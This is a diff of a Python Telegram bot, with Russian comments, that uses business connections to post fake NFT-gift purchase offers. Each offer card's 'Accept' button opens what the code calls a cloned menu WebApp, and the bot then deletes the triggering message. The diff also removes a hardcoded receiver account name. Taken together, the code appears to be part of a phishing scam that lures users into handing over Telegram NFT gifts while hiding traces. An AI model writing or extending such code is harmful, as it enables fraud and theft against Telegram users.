@@ -1,3 +1,4 @@
+# language: Python 3.12, file: bot.py
 import os
 import re
 import uuid
@@ -9,7 +10,7 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
-                           InlineKeyboardMarkup, BusinessConnection, WebAppInfo)
+                           InlineKeyboardMarkup, BusinessConnection)
 from dotenv import load_dotenv
 
 from app import make_offer, get_offer
@@ -21,7 +22,6 @@ log = logging.getLogger("offerbot")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")
-RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
@@ -114,7 +114,6 @@ async def handle_business_message(msg: Message):
     conn_id = msg.business_connection_id
     if not conn_id: return
 
-    # 1. СНАЧАЛА ОТПРАВЛЯЕМ КАРТОЧКУ
     target_user = msg.from_user.username or "buyer"
     card_text = (
         f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
@@ -123,7 +122,7 @@ async def handle_business_message(msg: Message):
         f"https://t.me/nft/{offer['nft_slug']}"
     )
 
-    # Делаем кнопку "Принять" ведущей на WebApp (клон меню)
+    # Кнопка "Принять" ведет на наш WebApp (клон меню)
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
          InlineKeyboardButton(text="Принять", url=f"{BASE_URL}/offer/{oid}")]
@@ -136,7 +135,6 @@ async def handle_business_message(msg: Message):
         )
         log.info("✅ Карточка отправлена")
         
-        # 2. Удаляем код
         await asyncio.sleep(0.5)
         try:
             await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
@@ -159,6 +157,9 @@ async def on_reject(cb: CallbackQuery):
 async def on_business_conn(conn: BusinessConnection):
     log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
 
+# ==========================================
+# ЗАПУСК
+# ==========================================
 async def main():
     log.info("Starting bot...")
     await dp.start_polling(bot)
